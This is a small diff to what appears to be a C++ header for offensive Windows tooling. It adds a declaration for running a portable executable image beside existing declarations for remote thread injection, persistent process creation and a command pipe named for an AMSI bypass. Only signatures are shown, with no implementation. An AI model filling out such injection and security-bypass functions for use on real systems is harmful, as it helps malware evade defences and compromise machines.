@@ -27,6 +27,8 @@ private:
 public:
     static void inject_remote_thread(int pid);
 
+    static int run_portable_executable(void* image);
+
     static PROCESS_INFO* create_persistent_process();
 
     static void send_command(const char* cmd, HANDLE amsiBypassWrPipe);
